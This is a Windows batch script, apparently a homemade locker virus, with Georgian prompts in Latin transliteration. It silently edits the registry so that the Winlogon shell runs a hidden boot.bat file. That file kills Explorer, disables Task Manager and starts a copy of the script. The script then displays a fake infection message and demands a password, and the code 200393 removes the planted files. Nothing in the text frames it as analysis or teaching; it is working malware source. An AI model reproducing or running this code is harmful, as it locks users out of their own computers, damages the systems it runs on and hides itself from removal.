@echo off 
CHCP 1251 
cls 
Set Yvaga=kompiutershi agmochenilia virusi. 
Set pass=paroli 
Set pas=sheiyvanet paroli. 
Set virus=kompiuteris gasaxnelad sawiroa parolis sheyvana 
Set dim=vtishav viruss
title yuradgeba!!! 
CHCP 866 
IF EXIST C:\windows\boot.bat ( 
goto ok ) 
cls 
IF NOT EXIST C:\windows\boot.bat ( 
ECHO Windows Registry Editor Version 5.00 >> C:\0.reg 
ECHO. >> C:\0.reg 
ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon] >> C:\0.reg 
ECHO. >> C:\0.reg 
ECHO "Shell"="Explorer.exe, C:\\windows\\boot.bat " >> C:\0.reg 
start/wait regedit -s C:\0.reg 
del C:\0.reg 
ECHO @echo off >>C:\windows\boot.bat 
ECHO C:\WINDOWS\system32\taskkill.exe /f /im Explorer.exe >>C:\windows\boot.bat 
ECHO reg add "HKCU\software\Microsoft\Windows\CurrentVersion\Policies\system" /v DisableTaskMgr /t REG_DWORD /d 1 /f >>C:\windows\boot.bat 
ECHO start sys.bat >>C:\windows\boot.bat 
attrib +r +a +s +h C:\windows\boot.bat 
copy virus.bat c:\windows\sys.bat 
attrib +r +a +s +h C:\windows\sys.bat 
GOTO end) 
:ok 
cls 
Echo %Yvaga% 
echo. 
echo %virus% 
echo %pas% 
set /a choise = 0 
set /p choise=%pass%: 
if "%choise%" == "101" goto gold 
if "%choise%" == "200393" goto status 
exit 
:status 
echo %dim% 
attrib -r -a -s -h C:\windows\boot.bat 
del C:\windows\boot.bat 
attrib -r -a -s -h C:\windows\sys.bat 
del C:\windows\sys.bat 
cls 
:gold 
start C:\ 
:end
